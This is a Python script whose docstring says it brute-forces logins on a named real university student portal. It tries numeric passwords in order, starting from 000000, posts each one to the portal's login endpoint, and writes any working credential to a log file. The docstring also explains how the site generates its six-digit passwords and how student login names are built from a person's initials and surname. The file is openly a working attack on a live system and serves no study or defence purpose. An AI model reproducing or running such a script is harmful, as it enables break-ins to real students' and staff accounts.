#!/usr/bin/python3
#coding: utf-8
import requests
import threading
import time
import sys
from bs4 import BeautifulSoup

"""Brute-force script for hacking student portal (do.dvgups.ru).
   They use auto-generated passwords 000000 to 999999 also for departments.
   Department logins names as they are.
   Student's logins build by pattern of name[0]+fathername[0]+surname
"""

class Brute(object):
    url = 'http://do.dvgups.ru/login/inc/enter.cfm'
    responseText = ''
    logFile = open('log.txt', 'w')
    isFound = False
    login = u'its'
    password = 000000 
    params = {
        'email1':login,
        'pass':password
    }

    def auth(self):
        session = requests.Session()

        while True:
            if self.isFound:
                sys.exit()
            print('bruting [', self.params['pass'], ']')
            self.responseText = session.post(self.url, self.params).text
            if 'yes' in self.responseText:
                self.isFound = True
                print('password found: [', self.params['pass'], ']')
                print(self.responseText)
                self.logFile.write(self.params['email1'] + ':' + str(self.params['pass']))
                self.logFile.close()
                sys.exit()
            self.password = self.password + 1
            self.params['pass'] = self.password

if __name__ == '__main__':
    brute = Brute()

    t1 = threading.Thread(target=Brute.auth, args=(brute,))
    t1.start()
